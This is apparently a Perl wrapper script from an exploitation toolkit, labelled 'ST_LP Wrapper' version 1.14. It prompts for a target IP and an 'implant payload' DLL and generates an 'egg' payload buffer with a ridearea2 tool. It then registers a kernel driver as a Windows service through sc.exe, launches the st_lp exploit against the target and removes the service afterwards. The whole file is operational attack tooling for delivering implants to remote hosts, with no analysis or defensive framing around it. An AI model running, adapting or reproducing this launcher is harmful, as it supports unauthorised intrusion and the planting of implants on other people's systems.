
use FindBin;
use lib "$FindBin::Bin";
use Getopt::Long;
use File::Spec::Functions;
use Cwd;

use lib "$FindBin::Bin\\..\\..\\Resources\\Perl";
use ExploitUtils qw(
	$EU_LOGFILE
	$EU_VERBOSE
	$EU_BATCHMODE
	EU_LogInit
	EU_Log
	EU_ExitMessage
	EU_GetInput
	EU_GetExistingDir
	EU_GetIP
	EU_GetLocalIP
	EU_GetRootDir
	EU_GetPort
	EU_GetPayloadFile
	EU_RunCommand
	EU_GetAddr
);


$::VERSION_NUM = "1.14";
$::VERSION = "ST_LP Wrapper: Version $::VERSION_NUM";

print "$::VERSION\n\n";

use vars qw($SERVICENAME $PAYLOAD $STLPEXE $RIDEAREA2 $IMAGE $SCEXE @DEPFILES);

$::SERVICENAME = "lp_mstcp";

$::STLPEXE   = "exploits\\st $::VERSION_NUM\\st_lp.exe";
$::IMAGE     = "exploits\\st $::VERSION_NUM\\$::SERVICENAME.sys";
$::RIDEAREA2 = "resources\\tools\\ridearea2.exe";
$::SCEXE     = "resources\\tools\\sc.exe";

my	$logfile_prefix	= "st_lp_";
my	$logfile_suffix	= "_script.txt";
my	$work_dir       = "E:\\";
my	$root_dir       = "$FindBin::Bin\\..\\..";
#my	$EPcallbackIP	= 0;
my	$localIP	    = 0;

my	%opts = ();

GetOptions(\%opts, "v", "h", "q|?", "b", "e=s", "f=s", "d=s", "t=s", "l=s", "c=s") or &print_script_usage(0);

if (scalar(@ARGV) > 0 ) {
  &EU_Log(1, "Extraneous arguments found on command line: @ARGV");
  &EU_Log(1, "Arguments will be ingnored");
  while(@ARGV) {shift;}
}

&print_script_usage(1) if (defined $opts{"h"});
&print_script_usage(0) if (defined $opts{"q"});
&print_script_usage(1) if (!defined $opts{"f"});

$ExploitUtils::EU_VERBOSE   = 1 if (defined $opts{"v"});
$ExploitUtils::EU_BATCHMODE = 1 if (defined $opts{"b"});

$work_dir       = "$opts{d}" if (defined $opts{"d"});
$root_dir       = "$opts{c}" if (defined $opts{"c"});
$targetIP       = "$opts{t}" if (defined $opts{"t"});
$localIP        = "$opts{l}" if (defined $opts{"l"});

$::PAYLOAD      = "$opts{f}";
$::STLPEXE	= "$opts{e}\\st_lp.exe" if (defined $opts{"e"});
$::IMAGE	= "$opts{e}\\$::SERVICENAME.sys" if (defined $opts{"e"});

if ($ENV{"OS"} ne "Windows_NT") {
    &EU_ExitMessage(1,"This script requires Windows NT or Windows 2000");
}

@DEPFILES = ($::STLPEXE, $::RIDEAREA2, $::IMAGE, $::SCEXE);

$work_dir = &EU_GetExistingDir("Enter pathname for operation's working directory", $work_dir, 1);
$root_dir = &EU_GetRootDir($root_dir,@::DEPFILES);

&EU_LogInit($logfile_prefix, $logfile_suffix, $work_dir);
&EU_Log(0,"$::VERSION");

&EU_Log(0,"\nChanging to working directory: $work_dir");
chdir $work_dir || &EU_ExitMessage(1,"Unable to change to working directory: $work_dir");

my $cur_dir = cwd();
my $payload_file = "$::PAYLOAD";

if(!$EU_BATCHMODE) {
  if ($localIP == 0) {
     $localIP = &EU_GetLocalIP("\nEnter the local IP address to be used");
  }
}

if ( -f "$payload_file" ) {
	&EU_Log(1,"\nCreating payload file ($work_dir\\st_ep_egg.ra2) for possible upload...");

	&EU_RunCommand("$root_dir\\$::RIDEAREA2 -l m -i $payload_file -o $work_dir\\st_ep_egg.ra2");
} else {
	&EU_Log(1,"\nPayload file ($payload_file) doesn't exist...skipping egg generation");
}

if(!$EU_BATCHMODE) {
	my $answer;
	$answer = &EU_GetInput("\nReady to begin ST_LP ([y],n)? ", "y");
	&EU_ExitMessage(0,"User terminated script")  if ("$answer" ne "y");
}

my $flags;
if ($ExploitUtils::EU_VERBOSE) {
	$flags = "-v";
} else {
	$flags = "";
}

&EU_Log(1,"\nEnsuring previous ST_LP service entries (if any) have been removed -- this may produce an error message.");
&EU_Log(0,"Running command: $root_dir\\$::SCEXE delete $::SERVICENAME");
system("$root_dir\\$::SCEXE delete $::SERVICENAME");
&EU_Log(1,"\nCreating new ST_LP service entries");
&EU_Log(0,"Running command: $root_dir\\$::SCEXE create $::SERVICENAME binPath= \"$root_dir\\$::IMAGE\" type= kernel start= demand error= ignore");
system("$root_dir\\$::SCEXE create $::SERVICENAME binPath= \"$root_dir\\$::IMAGE\" type= kernel start= demand error= ignore");

&EU_Log(1,"\nST_LP will launch in a separate window. Follow the status messages");
&EU_Log(1,"\nLaunching ST_LP ...\n");

&EU_Log(0, "start \"ST_LP\" cmd /K $root_dir\\$::STLPEXE $localIP $targetIP");
&EU_RunCommand("start \"ST_LP\" cmd /K \"\"$root_dir\\$::STLPEXE\" $localIP $targetIP\"");

sleep(3);
&EU_Log(1,"\nRemoving ST_LP service entries.");
&EU_Log(0,"Running command: $root_dir\\$::SCEXE delete $::SERVICENAME");
system("$root_dir\\$::SCEXE delete $::SERVICENAME");

&EU_ExitMessage(0,"\nDone with $::0.");

sub print_script_usage() {
	my ($verbose) = @_;
	print "$::VERSION\n";

	print qq~
Usage: $::0 [-v] [-h] [-?] [-b]
            [-c <root directory>] [-d <working directory>] [-e <exploits directory>]
			[-t <target IP>] [-l <local IP>] -f <payload dll>
	 
~;
	if ($verbose) {
		print qq~

  -v                    Verbose mode. Default non-verbose mode.

  -h                    Print this help information.

  -?                    Print abbreviated help information.

  -b                    Batch (non-interactive) mode. Default interactive mode.

  -c <root directory>   Exploits Root Directory.
                        Top-level directory containing exploit files.
						Default one directory up from directory containing this script.

  -d <working directory> Working Directory.
                        Top-level directory where operation's files will be
                        generated. Default E:\.

  -e <exploits directory> Exploits Directory
                        Top-level directory containing exploit files.
						Default one directory up from directory containing this script.

  -t <target IP>        Target IP address.
                        Default derived as last part of working directory name.

  -l <local IP>         Local IP address.
                        Default is host's IP address (unless machine has multiple IPs).

  -f <payload dll>      Filename of the implant payload. Required. If file exists, then
                        an egg file buffer is generated.

~;
	}

	&EU_ExitMessage(1,"End of help.");
}

__END__
